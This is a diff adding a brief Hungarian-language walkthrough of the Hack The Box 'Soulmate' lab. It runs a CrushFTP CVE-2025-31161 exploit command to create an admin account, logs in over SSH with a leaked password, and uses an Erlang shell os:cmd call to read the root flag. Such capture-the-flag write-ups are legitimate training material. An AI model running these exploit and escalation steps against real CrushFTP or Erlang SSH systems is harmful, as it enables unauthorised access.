@@ -1,0 +1,43 @@
+Soulmate HTB Hivatalos Levezető
+1. Felfedezés
+
+    Nmap: 22, 80, 31337, 4369 portok
+
+    Subdomain: ftp.soulmate.htb (CrushFTP)
+
+2. Kezdeti Hozzáférés
+
+    CrushFTP CVE-2025-31161 exploit:
+    bash
+
+python cve-2025-31161.py --target_host ftp.soulmate.htb --port 80 --target_user root --new_user admin --password admin123
+
+    CrushFTP admin panel: http://ftp.soulmate.htb
+
+    Ben user létrehozása admin panelben
+
+3. User Flag
+bash
+
+ssh ben@soulmate.htb
+# Bejelentkezés → user.txt megszerzése
+
+4. Privilege Escalation → Root
+bash
+
+# SSH ben-ként belül
+ssh -p 2222 ben@localhost
+# Jelszó: HouseH0ldings998
+
+# Erlang shell
+os:cmd("cat /root/root.txt").
+
+Kulcs Pontok
+
+    Nem kellett SQL injection
+
+    Nem kellett web shell feltöltés
+
+    CrushFTP exploit → Admin access → Ben user → SSH → Erlang SSH → Root
+
+Teljesen tiszta volt az út! ✅
